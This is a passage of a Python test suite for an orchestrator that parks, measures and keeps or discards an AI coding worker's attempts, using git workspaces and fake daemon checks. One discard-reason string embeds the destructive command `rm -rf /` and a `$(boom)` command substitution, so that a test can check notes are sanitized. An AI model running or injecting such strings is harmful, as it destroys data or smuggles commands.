"""ao-attempt - the turn boundary: a coding attempt is PARKED at the next plan wake, measured,
and KEPT as completed plan steps or DISCARDED (tree reset, attempt on a hidden ref, a bounded
note framed against the anchor) - never left as clutter, never silently wiped.

Evidence: C7a (plan store agent-bakeoff/findings/c7a-analysis-2026-10-11.md 3.3): the re-plan
after a loop-guard stop ran in the still-dirty tree and `_revert_plan_turn_writes` wiped the
coding turn's edits (3 of 10 editing turns). ao-planrevert's two rounds failed on the channel
(git proxy, open-terminal framing); ao-attempt round 1 failed partly because its tests replaced
`router.exec_check`. So here EVERYTHING above the daemon is real: the Router (scheduler,
workspace focus, the pre-turn probe, exec_check's instance guard), the plan gate, `_run_step`.
Only the daemon's `/check` (FakeHarness.run_check) and the turns' file effects are fakes, and
`/check` reaches a workspace whose `git` is the real `git_proxy.classify()` and whose output is
framed like the real channel (tests/attempt_ws.py). The same scenarios run against the REAL
little-coder-open-terminal image when AO_ATTEMPT_OT_CONTAINER names an offline container of it.

Imports of `app.modules.attempts` are LOCAL to the tests that need it, so the base-compatible
scenarios (C7a replay, plan-turn writes) run - and fail - against the pre-fix orchestrator.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
from pathlib import Path

import pytest
from sqlalchemy import select

from app.adapters.chat import FakeChatAdapter
from app.config import Settings
from app.db import Database
from app.models import EffortConstraint, Event, WorkerInstance
from app.modules.model_router import FakeModelClient
from app.orchestrator import Orchestrator
from app.worker.harness import FakeHarness

from attempt_ws import BASH, GIT, REPO_ROOT, ContainerWS, LocalWS, daemon_frame

ROOT = Path(__file__).resolve().parents[1]
REPO = "https://github.com/acme/gym.git"
# the ACCEPTED goal: its list lines are the effort's fixed anchor items A1, A2 (round 3)
GOAL = "- greet() returns a greeting\n- farewell() exists"
CONTENT_MARK = "CONTENTMARK_93f1"     # file content: must never reach audit or notes
CMD_MARK = "CMDMARK_5521"             # worker check command text: same

pytestmark = pytest.mark.skipif(not (BASH and GIT), reason="needs bash and git")

_CONTAINER = os.environ.get("AO_ATTEMPT_OT_CONTAINER", "")
_KEY = os.environ.get("AO_ATTEMPT_OT_KEY", "ao-attempt-test-key")


def _a():
    from app.modules import attempts
    return attempts


# ── harness: real Router; fake daemon /check + fake turn effects ─────────────────────────────
async def _orch(db_url, urls="http://w1:8090", workers=1):
    settings = Settings(
        _env_file=None, chat_adapter="fake",
        profiles_dir=str(ROOT / "profiles"), charters_dir=str(ROOT / "charters"),
        floor_dir=str(ROOT / "floor"), worker_instance_urls=urls,
        max_concurrent_workers=workers, database_url=db_url, project_survey_enabled=False,
        review_mode="off", plan_approval="off", worker_plan_gate="all",
    )
    db = Database(db_url)
    orch = Orchestrator(settings, db, FakeChatAdapter(),
                        model_client=FakeModelClient(), harness=FakeHarness())
    await orch.setup()
    return orch, db


async def _shutdown(orch, db):
    if orch._bg_tasks:
        await asyncio.gather(*list(orch._bg_tasks))
    for t in (orch._capacity_task, orch._stall_task, orch._reaper_task):
        if t is not None:
            t.cancel()
            try:
                await t
            except (asyncio.CancelledError, Exception):  # noqa: BLE001
                pass
    await db.dispose()


def _wire(orch, ws, by_url: dict | None = None):
    """The DAEMON's /check -> the workspace (per worker base_url when several); router.exec_check,
    the scheduler and the focus map stay real. A plan / coding wake first performs the next
    queued action of its kind (what that turn's shell did to the tree)."""
    orch._plan_actions, orch._code_actions = [], []

    def _ws_for(base_url):
        return (by_url or {}).get(base_url, ws)

    async def _check(base_url, command, *, cwd=None, timeout=600):
        orch.harness.checks.append({"base_url": base_url, "command": command})
        return await asyncio.to_thread(_ws_for(base_url).bridge, command)

    async def _check_fn(base_url, command):
        return await asyncio.to_thread(_ws_for(base_url).bridge, command)

    orch.harness.run_check = _check
    orch.harness.check_fn = _check_fn
    orig = orch.harness.wake

    async def _wake(base_url, session_id, prompt, **kw):
        q = orch._plan_actions if kw.get("plan_only") else orch._code_actions
        if q:
            act = q.pop(0)
            if act is not None:
                await asyncio.to_thread(act, _ws_for(base_url))
        return await orig(base_url, session_id, prompt, **kw)

    orch.harness.wake = _wake


async def _effort(orch):
    await orch.projects.add("gym", REPO)
    eid, chan, root = await orch.router.open_effort("feat", project="gym")
    await orch.charters.set_goal(eid, GOAL, created_by="po")
    return eid, chan, root


async def _gate(orch, eid, chan, root, *replies):
    orch.harness.output_queue.extend(replies)
    return await orch._worker_plan_gate(eid, chan, root, GOAL, REPO, None, None, None)


async def _code(orch, eid, chan, root, action, reply="done"):
    """A coding turn through the real `_run_step` (router.wake: focus, the pre-turn probe)."""
    orch._code_actions.append(action)
    orch.harness.output_queue.append(reply)
    return await orch._run_step(eid, chan, root, "execute the approved plan", 1, 1, REPO, False)


async def _events(orch, eid, kind=None) -> list[dict]:
    async with orch.db.session_factory() as s:
        q = select(Event).where(Event.effort_id == eid)
        if kind:
            q = q.where(Event.kind == kind)
        return [{"kind": e.kind, "payload": e.payload} for e in (await s.execute(q)).scalars()]


async def _notes(orch, eid) -> list[str]:
    async with orch.db.session_factory() as s:
        rows = (await s.execute(select(EffortConstraint).where(
            EffortConstraint.effort_id == eid, EffortConstraint.kind == "attempt_discard",
            EffortConstraint.active.is_(True)))).scalars().all()
        return [r.body for r in rows]


async def _attempt_row(orch, aid):
    from app.models import EffortAttempt
    async with orch.db.session_factory() as s:
        return await s.get(EffortAttempt, aid)


def _no_denials(ws):
    denied = [c for c in ws.calls() if c.get("action") == "deny" or "DENIED" in json.dumps(c)]
    assert denied == [], f"the worker's git proxy denied: {denied}"


def _branch(ws) -> str:
    return ws.git("rev-parse", "--abbrev-ref", "HEAD").strip()


def _base(ws) -> str:
    ws.write("a.py", "def greet():\n    return 'base'\n")
    ws.write("check.sh", "echo 't.py::test_old PASSED'\n")
    ws.git("add", "-A")
    ws.git("commit", "-q", "-m", "base")
    return ws.git("rev-parse", "HEAD").strip()


PLAN_1 = (
    "UNDERSTANDING: add greet and farewell\n"
    "ALREADY DONE: nothing\n"
    "ANCHOR ITEMS:\n"
    "A1: greet() returns a greeting\n"
    "A2: farewell() exists\n"
    "PLAN:\n"
    "1. edit a.py so greet returns hello [anchor: A1]\n"
    "2. add b.py with farewell [anchor: A2]\n"
    "WON'T DO: nothing else\n"
    "RISKS: none")


def _plan_next(verdict: str) -> str:
    return ("UNDERSTANDING: finish the goal\n"
            "ALREADY DONE: see the parked attempt\n"
            "ANCHOR ITEMS:\nA1: greet() returns a greeting\nA2: farewell() exists\n"
            "PLAN:\n1. document greet in README.md [anchor: A1]\n"
            "WON'T DO: nothing else\nRISKS: none\n"
            + (f"VERDICT: {verdict}" if verdict else ""))


def _edits(w):
    """A coding turn: greet edited, b.py new - left uncommitted."""
    w.write("a.py", f"def greet():\n    return 'hello'  # {CONTENT_MARK}\n")
    w.write("b.py", f"def farewell():\n    return 'bye'  # {CONTENT_MARK}\n")


def _checks_reply(*lines) -> str:
    return "done.\nCHECKS:\n" + "\n".join(lines) + "\n"


# ── scenarios (run on the framed local workspace AND the real image) ─────────────────────────
async def scenario_keep(orch, ws):
    """Coding edits survive a no-write plan turn: parked, then kept as one commit per step."""
    att = _a()
    s0 = _base(ws)
    br = _branch(ws)
    eid, chan, root = await _effort(orch)
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
    stored = await _events(orch, eid, "plan_steps_stored")
    assert stored and stored[-1]["payload"]["anchors"] == ["A1", "A2"]
    await _code(orch, eid, chan, root, _edits, _checks_reply(f"step 1: sh check.sh {CMD_MARK}"))
    assert (await _attempt_row(orch, f"{eid}:a1")).start_sha == s0
    assert await _gate(orch, eid, chan, root, _plan_next("KEEP 1-2")) is not None
    assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")
    assert ws.git("status", "--porcelain").strip() == "" and _branch(ws) == br
    log = ws.git("log", "--format=%s", f"{s0}..{br}").splitlines()
    assert len(log) == 2 and "step 1" in log[1] and "step 2" in log[0]
    assert ws.git("show", "--name-only", "--format=", f"{br}~1").split() == ["a.py"]
    assert ws.git("show", "--name-only", "--format=", br).split() == ["b.py"]
    assert CONTENT_MARK in ws.git("show", f"{att.ref_name(eid, 1)}:b.py")
    kept = await _events(orch, eid, "attempt_kept")
    assert kept and kept[-1]["payload"]["verified"] is True and kept[-1]["payload"]["commits"] == 2
    _no_denials(ws)
    return eid


async def scenario_discard(orch, ws):
    """R3: with the real router, the first attempt's start is recorded (the worker COMMITS part
    of its work itself); a discard resets the BRANCH to that start, the attempt is on its ref,
    the note is in the plan, a v1-shaped learning record is produced."""
    att = _a()
    s0 = _base(ws)
    br = _branch(ws)
    eid, chan, root = await _effort(orch)
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None

    def coding(w):
        _edits(w)
        w.git("add", "a.py")
        w.git("commit", "-q", "-m", "worker commits greet")      # the worker's own commit
        w.write("check.sh", "echo 't.py::test_old FAILED'\necho 't.py::test_added FAILED'\nexit 1\n")

    await _code(orch, eid, chan, root, coding, _checks_reply(f"step 1: sh check.sh {CMD_MARK}"))
    reason = "farewell broke the greeting contract `rm -rf /` $(boom); it does not serve A2"
    assert await _gate(orch, eid, chan, root, _plan_next(f"DISCARD 2 deviation: {reason}")) is not None
    # the BRANCH (name and tip) is back at the attempt's start, worker commit included
    assert _branch(ws) == br and ws.git("rev-parse", br).strip() == s0
    assert ws.git("status", "--porcelain").strip() == ""
    assert CONTENT_MARK not in ws.read("a.py") and ws.read("b.py") is None
    ref = att.ref_name(eid, 1)
    assert CONTENT_MARK in ws.git("show", f"{ref}:a.py") and CONTENT_MARK in ws.git("show", f"{ref}:b.py")
    # R1: test_old passed at the start = regression; test_added is NEW (same, existing file)
    facts = (await _events(orch, eid, "attempt_facts"))[-1]["payload"]
    # the FACT is check-level: c1 passed at the start, fails now
    assert [(c["check"], c["outcome"], c["anchor"]) for c in facts["checks"]] == [("c1", "regression", "A1")]
    assert facts["checks"][0]["start"] == "PASS" and facts["checks"][0]["now"].startswith("FAIL")
    # optional per-test detail (R1 kept): test_old regressed, test_added (same file) is new
    assert facts["tests"]["regressed"] == ["t.py::test_old"] and facts["tests"]["new"] == ["t.py::test_added"]
    plan_prompt = [w for w in orch.harness.wakes if w["plan_only"]][-1]["prompt"]
    assert "REGRESSION (passed at the start" in plan_prompt and "VERDICT" in plan_prompt and "anchor" in plan_prompt
    notes = await _notes(orch, eid)
    assert len(notes) == 1
    note = notes[0]
    assert "anchor item A2" in note and len(note) <= att.NOTE_MAX
    for bad in (CONTENT_MARK, CMD_MARK, "rm -rf", "$(", "`"):
        assert bad not in note
    rec = await _events(orch, eid, "attempt_learning_record")
    assert rec and rec[-1]["payload"]["anchor"] == "A2"
    row = await _attempt_row(orch, f"{eid}:a1")
    assert row.state == "discarded" and row.learning_record["outcome"]["summary"] == note
    _no_denials(ws)
    return eid


async def scenario_plan_writes(orch, ws):
    """A plan turn that writes, commits, stages or switches branch is still reverted."""
    s0 = _base(ws)
    br = _branch(ws)
    eid, chan, root = await _effort(orch)

    def plan_writes(w):
        w.write("c.py", "sneaky\n")
        w.write("a.py", "plan turn overwrote a.py\n")

    # (a) clean tree (first gate: no worker focused before the plan wake)
    orch._plan_actions.append(plan_writes)
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
    assert ws.read("c.py") is None and "base" in ws.read("a.py")
    assert ws.git("rev-parse", "HEAD").strip() == s0
    # (b) on top of a parked attempt: only the plan turn's writes go
    await _code(orch, eid, chan, root, _edits)
    orch._plan_actions.append(plan_writes)
    await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
    assert ws.read("c.py") is None
    assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")
    assert ws.git("status", "--porcelain").strip() == ""
    head = ws.git("rev-parse", "HEAD").strip()

    # (c) the plan turn COMMITS
    def plan_commits(w):
        w.write("d.py", "committed by the plan turn\n")
        w.git("add", "-A")
        w.git("commit", "-q", "-m", "plan turn commit")

    orch._plan_actions.append(plan_commits)
    await _gate(orch, eid, chan, root, _plan_next(""))
    assert ws.read("d.py") is None and ws.git("rev-parse", "HEAD").strip() == head
    assert await orch._event_count(eid, "plan_turn_moved_head") == 1

    # (d) the plan turn only STAGES
    def plan_stages(w):
        w.write("a.py", "staged by the plan turn\n")
        w.git("add", "a.py")

    orch._plan_actions.append(plan_stages)
    await _gate(orch, eid, chan, root, _plan_next(""))
    assert CONTENT_MARK in ws.read("a.py") and ws.git("status", "--porcelain").strip() == ""

    # (e) the plan turn SWITCHES BRANCH and commits there
    def plan_switches(w):
        w.git("checkout", "-q", "-b", "plan-side")
        w.write("e.py", "on another branch\n")
        w.git("add", "-A")
        w.git("commit", "-q", "-m", "side")

    orch._plan_actions.append(plan_switches)
    await _gate(orch, eid, chan, root, _plan_next(""))
    assert _branch(ws) == br and ws.git("rev-parse", "HEAD").strip() == head
    assert ws.read("e.py") is None and ws.git("status", "--porcelain").strip() == ""
    _no_denials(ws)
    return eid


async def scenario_big_output(orch, ws):
    """R2: two checks of ~400 long-id tests each (far past the 64 KB /check tail together), one
    regression hidden in each: both are reported, with exact counts."""
    _base(ws)
    eid, chan, root = await _effort(orch)
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
    long = "tests/integration/test_" + "x" * 60 + "_behaviour.py::test_case_"
    start = "".join(f"echo '{long}{i} PASSED'\n" for i in range(400))
    ws.write("big1.sh", start)
    ws.write("big2.sh", start.replace("behaviour", "contract"))
    ws.git("add", "-A")
    ws.git("commit", "-q", "-m", "suites")

    def coding(w):
        _edits(w)
        w.write("big1.sh", start.replace(f"{long}377 PASSED", f"{long}377 FAILED")
                + "head -c 300000 /dev/zero | tr '\\0' 'y'\necho\nexit 1\n")
        w.write("big2.sh", start.replace("behaviour", "contract").replace(
            "contract.py::test_case_5 PASSED", "contract.py::test_case_5 FAILED") + "exit 1\n")

    await _code(orch, eid, chan, root, coding,
                _checks_reply("step 1: sh big1.sh", "step 2: sh big2.sh"))
    await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
    facts = (await _events(orch, eid, "attempt_facts"))[-1]["payload"]
    assert facts["n_untrusted"] == 0
    assert facts["n_regression"] == 2
    assert [c["outcome"] for c in facts["checks"]] == ["regression", "regression"]
    got = sorted(t.rsplit("_", 1)[-1] for t in facts["tests"]["regressed"])
    assert got == ["377", "5"]
    _no_denials(ws)
    return eid


async def scenario_branch_moving_checks(orch, ws):
    """R4: worker checks that move HEAD / the branch / switch branch / leave files: after the
    park the BRANCH (name and tip) is exactly the parked attempt, and a KEEP lands on it."""
    s0 = _base(ws)
    br = _branch(ws)
    eid, chan, root = await _effort(orch)
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
    ws.write("mv1.sh", "git reset -q HEAD~1\necho 't.py::test_old PASSED'\n")
    ws.write("mv2.sh", "git commit -q --allow-empty -m by-check\n")
    ws.write("mv3.sh", "git checkout -q -b check-side\necho stray > stray.txt\nexit 1\n")
    ws.git("add", "-A")
    ws.git("commit", "-q", "-m", "checks")
    s1 = ws.git("rev-parse", "HEAD").strip()
    await _code(orch, eid, chan, root, _edits, _checks_reply(
        "step 1: sh mv1.sh", "step 1: sh mv2.sh", "step 2: sh mv3.sh"))
    await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
    assert _branch(ws) == br
    assert CONTENT_MARK in ws.git("show", f"{br}:a.py") and CONTENT_MARK in ws.git("show", f"{br}:b.py")
    assert ws.git("rev-parse", f"{br}~2").strip() == s1          # exactly two step commits
    assert ws.read("stray.txt") is None and ws.git("status", "--porcelain").strip() == ""
    kept = (await _events(orch, eid, "attempt_kept"))[-1]["payload"]
    assert kept["verified"] is True
    assert s0 != s1
    _no_denials(ws)
    return eid


async def scenario_branch_moving_discard(orch, ws):
    """R4: a check that commits onto the branch, then DISCARD: the branch is at the start."""
    _base(ws)
    br = _branch(ws)
    eid, chan, root = await _effort(orch)
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
    ws.write("mv.sh", "git commit -q --allow-empty -m by-check\n")
    ws.git("add", "-A")
    ws.git("commit", "-q", "-m", "check")
    s1 = ws.git("rev-parse", "HEAD").strip()
    await _code(orch, eid, chan, root, _edits, _checks_reply("step 1: sh mv.sh"))
    await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: greet still wrong for A1"))
    assert _branch(ws) == br and ws.git("rev-parse", br).strip() == s1
    assert CONTENT_MARK not in ws.git("show", f"{br}:a.py")
    assert await orch._event_count(eid, "attempt_discarded") == 1
    assert CONTENT_MARK in ws.git("show", f"{_a().ref_name(eid, 1)}:a.py")
    _no_denials(ws)
    return eid


async def _facts_after(orch, ws, eid, chan, root, coding, reply, verdict="KEEP 1,2"):
    await _code(orch, eid, chan, root, coding, reply)
    await _gate(orch, eid, chan, root, _plan_next(verdict))
    return (await _events(orch, eid, "attempt_facts"))[-1]["payload"]


async def scenario_new_test_file(orch, ws):
    """F1: the worker adds a NEW test file and checks it alone (pytest-shaped output, exit 1):
    not a regression, not 'start not measurable' - a new check, not passing."""
    _base(ws)
    eid, chan, root = await _effort(orch)
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None

    def coding(w):
        _edits(w)
        w.write("t_new.sh", "echo 't_new.py::test_greet FAILED'\necho 't_new.py::test_bye FAILED'\nexit 1\n")

    facts = await _facts_after(orch, ws, eid, chan, root, coding, _checks_reply("step 1: sh t_new.sh"))
    assert [c["outcome"] for c in facts["checks"]] == ["new_not_passing"]
    assert facts["n_regression"] == 0 and facts["n_could_not_run_at_start"] == 0
    return eid


async def scenario_dotnet_and_shell(orch, ws):
    """F2: dotnet-test-shaped and plain-shell checks. c1 (dotnet) fails at the start AND now -
    still failing, its Adds test regressing visible as per-test detail; c2 (dotnet) passed at
    the start and fails now - REGRESSION; c3 (shell, no test lines) fails both - still failing;
    c4 (shell) failed at the start, passes now - fixed. Every check's pass/fail is in the prompt."""
    _base(ws)
    eid, chan, root = await _effort(orch)
    ws.write("dn1.sh", "echo '  Passed Calc.Tests.AddTests.Adds [1 ms]'\n"
                       "echo '  Failed Calc.Tests.AddTests.Subtracts [2 ms]'\nexit 1\n")
    ws.write("dn2.sh", "echo '  Passed Calc.Tests.MulTests.Muls [1 ms]'\n"
                       "echo 'Passed!  - Failed: 0, Passed: 1'\nexit 0\n")
    ws.write("sh3.sh", "echo broken; exit 3\n")
    ws.write("sh4.sh", "exit 1\n")
    ws.git("add", "-A")
    ws.git("commit", "-q", "-m", "checks")
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None

    def coding(w):
        _edits(w)
        w.write("dn1.sh", "echo '  Failed Calc.Tests.AddTests.Adds [1 ms]'\n"
                          "echo '  Failed Calc.Tests.AddTests.Subtracts [2 ms]'\nexit 1\n")
        w.write("dn2.sh", "echo '  Failed Calc.Tests.MulTests.Muls [1 ms]'\nexit 1\n")
        w.write("sh4.sh", "exit 0\n")

    facts = await _facts_after(orch, ws, eid, chan, root, coding, _checks_reply(
        "step 1: sh dn1.sh", "step 1: sh dn2.sh", "step 2: sh sh3.sh", "step 2: sh sh4.sh"))
    assert [c["outcome"] for c in facts["checks"]] == ["still_failing", "regression",
                                                       "still_failing", "fixed"]
    assert facts["checks"][2]["start"] == "FAIL (exit 3)" and facts["checks"][2]["now"] == "FAIL (exit 3)"
    assert "Calc.Tests.AddTests.Adds" in facts["tests"]["regressed"]
    prompt = [w for w in orch.harness.wakes if w["plan_only"]][-1]["prompt"]
    for k in (1, 2, 3, 4):
        assert f"check c{k} " in prompt
    assert "REGRESSION (passed at the start, fails now)" in prompt and "FIXED" in prompt
    return eid


async def scenario_fail_and_hang_both_times(orch, ws):
    """F2: a check that hangs at the start AND now is reported HANG (and killed); one that fails
    both times is still failing; the gate-wide budget stops later checks (not_run)."""
    _base(ws)
    eid, chan, root = await _effort(orch)
    assert await _gate(orch, eid, chan, root, PLAN_1) is not None
    facts = await _facts_after(orch, ws, eid, chan, root, _edits, _checks_reply(
        "step 1: sleep 600", "step 1: false", "step 2: sleep 600", "step 2: true"))
    out = [c["outcome"] for c in facts["checks"]]
    assert out[0] == "hang" and facts["checks"][0]["start"] == "HANG"
    assert out[1] == "still_failing"
    assert "not_run" in out[2:]                 # the gate-wide budget ran out
    assert ws.git("status", "--porcelain").strip() == ""
    return eid


@pytest.fixture(autouse=True)
def _short_check_timeouts(monkeypatch):
    """Checks that hang must not cost minutes in a test: 4 s per run, kill after 1 s more, and a
    gate-wide budget that covers two such checks (2 runs each) but not a third."""
    try:
        att = _a()
    except ImportError:          # the pre-fix base: no module (the base-compatible cases still run)
        return
    monkeypatch.setattr(att, "CHECK_TIMEOUT_S", 4)
    monkeypatch.setattr(att, "CHECK_KILL_S", 1)
    monkeypatch.setattr(att, "CHECKS_BUDGET_S", 60)


async def _run(db_url, ws, scenario):
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid = await scenario(orch, ws)
        blob = json.dumps(await _events(orch, eid))
        assert CONTENT_MARK not in blob and CMD_MARK not in blob
    finally:
        await _shutdown(orch, db)


# ── Case 1 / 2 / 3 ──────────────────────────────────────────────────────────────────────────
async def test_case1_coding_edits_survive_a_no_write_plan_turn_kept_as_step_commits(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_keep)


async def test_case2_a_discard_resets_the_branch_to_the_recorded_start(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_discard)


async def test_case3_a_plan_turn_that_writes_is_still_reverted(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_plan_writes)


# ── Case 4: the C7a replay (base-compatible: RED at base, GREEN at tip) ──────────────────────
C7A_RUNS = {
    "ao-queue-r2": (
        ["inference/llm-queue/src/llm_queue/app_state.py",
         "inference/llm-queue/src/llm_queue/config.py",
         "inference/llm-queue/src/llm_queue/routes/data.py",
         "inference/llm-queue/src/llm_queue/routes/health.py",
         "inference/llm-queue/src/llm_queue/scheduler.py"],
        ["inference/llm-queue/src/llm_queue/shedding.py"]),
    "ao-wd-offset-r2": (
        ["agent-org/agent-bridge/app/orchestrator.py",
         "agent-org/agent-bridge/app/worker/harness.py",
         "little-coder/src/littlecoder/daemon.py"],
        ["agent-org/agent-bridge/tests/test_stall_watchdog_task_switch.py",
         "little-coder/tests/test_event_lines.py"]),
    "ao-queue-r3": (
        ["inference/llm-queue/src/llm_queue/app_state.py",
         "inference/llm-queue/src/llm_queue/config.py",
         "inference/llm-queue/src/llm_queue/routes/data.py",
         "inference/llm-queue/src/llm_queue/routes/health.py",
         "inference/llm-queue/src/llm_queue/scheduler.py"],
        ["inference/llm-queue/src/llm_queue/shedding.py",
         "inference/llm-queue/tests/test_leak.py"]),
}

C7A_PLAN = ("UNDERSTANDING: continue the queue fix\nALREADY DONE: the edits in the tree\n"
            "ANCHOR ITEMS:\nA1: the queue sheds load\n"
            "PLAN:\n1. finish shedding.py and run its tests [anchor: A1]\n"
            "WON'T DO: nothing else\nRISKS: none\nVERDICT: KEEP 1")


async def _c7a(db_url, ws, run):
    modified, added = C7A_RUNS[run]
    for p in modified:
        ws.write(p, f"original {p}\n")
    ws.git("add", "-A")
    ws.git("commit", "-q", "-m", "base")
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)

        def coding(w):      # the coding turn (stopped by the loop guard) left these uncommitted
            for p in modified:
                w.write(p, f"coding turn edit {p}\n")
            for p in added:
                w.write(p, f"coding turn new file {p}\n")

        await _code(orch, eid, chan, root, coding)
        assert await _gate(orch, eid, chan, root, C7A_PLAN) is not None   # writes nothing
        for p in modified:
            assert ws.read(p) == f"coding turn edit {p}\n", p
        for p in added:
            assert ws.read(p) == f"coding turn new file {p}\n", p
        assert await orch._event_count(eid, "plan_turn_wrote_files") == 0
        _no_denials(ws)
    finally:
        await _shutdown(orch, db)


@pytest.mark.parametrize("run", sorted(C7A_RUNS))
async def test_case4_c7a_replay_keeps_the_coding_turns_edits(db_url, tmp_path, run):
    await _c7a(db_url, LocalWS(tmp_path), run)


# ── Case 5: plan steps carry a declared anchor item; refused once, then escalated ─────────────
async def test_case5_a_plan_without_anchor_items_is_refused_once_then_escalated(db_url, tmp_path):
    ws = LocalWS(tmp_path)
    _base(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        bare = "UNDERSTANDING: x\nPLAN:\n1. edit a.py\nWON'T DO: y\nRISKS: none"
        assert await _gate(orch, eid, chan, root, bare, bare) is None
        assert await orch._event_count(eid, "plan_steps_undeclared") == 2
        assert await orch._event_count(eid, "worker_plan_stopped") == 1
        assert all(w["plan_only"] for w in orch.harness.wakes)        # nothing delegated
        assert "REFUSED" in orch.harness.wakes[1]["prompt"]
        assert await orch._event_count(eid, "plan_steps_stored") == 0
    finally:
        await _shutdown(orch, db)


async def test_case5_refused_once_then_a_declared_plan_is_stored_before_delegation(db_url, tmp_path):
    ws = LocalWS(tmp_path)
    s0 = _base(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        bare = "UNDERSTANDING: x\nPLAN:\n1. edit a.py\nWON'T DO: y\nRISKS: none"
        assert await _gate(orch, eid, chan, root, bare, PLAN_1) is not None
        ev = await _events(orch, eid)
        kinds = [e["kind"] for e in ev]
        assert kinds.index("plan_steps_stored") < kinds.index("worker_plan_approved")
        stored = [e for e in ev if e["kind"] == "plan_steps_stored"][0]["payload"]
        assert stored["anchors"] == ["A1", "A2"] and stored["items"] == ["A1", "A2"]
        plan = await orch._effort_plan_row(eid)
        assert [s["anchor"] for s in plan["steps"]] == ["A1", "A2"]
        # R3: the first attempt's start is recorded right after the first plan turn
        row = await _attempt_row(orch, f"{eid}:a1")
        assert row.start_sha == s0 and row.start_src == "plan" and row.start_branch == _branch(ws)
    finally:
        await _shutdown(orch, db)


# ── Case 6: an unparseable verdict never discards; a KEEP that mis-attributes is asked again ──
async def test_case6_an_unparseable_verdict_keeps_the_attempt_parked_and_escalates(db_url, tmp_path):
    att = _a()
    ws = LocalWS(tmp_path)
    _base(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        await _code(orch, eid, chan, root, _edits)
        no_verdict = _plan_next("maybe later")
        assert await _gate(orch, eid, chan, root, no_verdict, no_verdict) is None
        assert await orch._event_count(eid, "attempt_verdict_unparseable") == 2
        assert await orch._event_count(eid, "attempt_discarded") == 0
        assert await orch._event_count(eid, "worker_plan_stopped") == 1
        assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")
        ref = att.ref_name(eid, 1)
        assert ws.git("rev-parse", ref).strip() == ws.git("rev-parse", "HEAD").strip()
        assert ws.git("status", "--porcelain").strip() == ""
        assert "no single, valid VERDICT" in orch.harness.wakes[-1]["prompt"]
        _no_denials(ws)
    finally:
        await _shutdown(orch, db)


async def test_case6_a_keep_that_leaves_out_a_changed_step_is_asked_again(db_url, tmp_path):
    ws = LocalWS(tmp_path)
    _base(ws)
    br = _branch(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        await _code(orch, eid, chan, root, _edits)
        # KEEP 1 would commit step 2's b.py as "step 1": asked again, then the full KEEP lands
        assert await _gate(orch, eid, chan, root, _plan_next("KEEP 1"),
                           _plan_next("KEEP 1 and 2")) is not None
        assert await orch._event_count(eid, "attempt_keep_conflict") == 1
        assert "b.py" in orch.harness.wakes[-1]["prompt"]
        log = ws.git("log", "--format=%s", "-2", br).splitlines()
        assert "step 2" in log[0] and "step 1" in log[1]
    finally:
        await _shutdown(orch, db)


# ── Case 7: three discards of one step escalate once; renumbering does not reset it ──────────
async def test_case7_three_discards_of_one_step_escalate_once_with_context(db_url, tmp_path):
    ws = LocalWS(tmp_path)
    s0 = _base(ws)
    br = _branch(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        results = []
        for i in range(4):
            await _code(orch, eid, chan, root,
                        lambda w, i=i: w.write("a.py", f"attempt {i} {CONTENT_MARK}\n"))
            plan = PLAN_1
            results.append(await _gate(
                orch, eid, chan, root,
                plan + f"\nVERDICT: DISCARD 1 no-solution: try {i} did not make greet return a greeting"))
            assert ws.git("rev-parse", br).strip() == s0 and "base" in ws.read("a.py")
        assert results[0] is not None and results[1] is not None
        assert results[2] is None                       # the third discard escalated
        esc = await _events(orch, eid, "attempt_step_escalated")
        assert len(esc) == 1
        assert await orch._event_count(eid, "worker_plan_stopped") == 1     # the escalation stops
        p = esc[0]["payload"]
        assert p["anchor"] == "A1" and p["discards"] == 3 and p["class"] == "no-solution-identified"
        assert len(p["attempts"]) == 3 and all(r.startswith("ao-attempts/") for r in p["refs"])
        posted = [m["message"] for m in orch.chat.posted if "discarded 3 times" in m["message"]]
        assert posted and "anchor item **A1**" in posted[0]
        notes = await _notes(orch, eid)
        assert 1 <= len(notes) <= _a().NOTES_CAP and all("anchor item A1" in n for n in notes)
        _no_denials(ws)
    finally:
        await _shutdown(orch, db)


async def test_case7_notes_are_capped_in_count(db_url, tmp_path):
    att = _a()
    orch, db = await _orch(db_url)
    try:
        eid, _c, _r = await _effort(orch)
        for i in range(att.NOTES_CAP + 3):
            await orch._store_attempt_note(eid, f"{eid}:a{i}", f"note {i} anchor item A1")
        notes = await _notes(orch, eid)
        assert len(notes) == att.NOTES_CAP and notes[-1].startswith(f"note {att.NOTES_CAP + 2}")
    finally:
        await _shutdown(orch, db)


def test_case7_anchor_items_are_derived_from_the_accepted_goal():
    att = _a()
